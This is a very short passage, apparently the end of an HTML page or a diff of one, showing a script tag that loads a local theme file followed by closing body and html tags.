src="/js/theme.min.js"></script></body>
+</html>
